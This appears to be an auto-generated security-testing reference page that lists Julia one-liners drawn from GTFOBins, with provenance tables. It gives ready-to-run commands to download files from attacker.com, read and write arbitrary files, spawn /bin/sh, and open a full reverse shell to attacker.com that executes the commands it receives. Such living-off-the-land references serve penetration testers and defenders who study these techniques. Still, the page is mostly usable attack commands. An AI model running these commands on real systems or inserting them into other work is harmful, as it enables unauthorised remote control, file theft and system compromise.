---
parsed_by: focuslocust
source: commands
type: generated
---
# julia Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## julia

Tool page: [julia](../../tools/linux/julia.md)

### download

```text
julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/julia` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
julia -e 'print(open(f->read(f, String), "/path/to/input-file"))'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/julia` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
julia -e 'open(f->write(f, "DATA"), /path/to/output-file, "w")'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/julia` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/julia` |
| Evidence | Function example preserved from source parser. |

### shell

```text
julia -e 'run(`/bin/sh`)'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/julia` |
| Evidence | Function example preserved from source parser. |
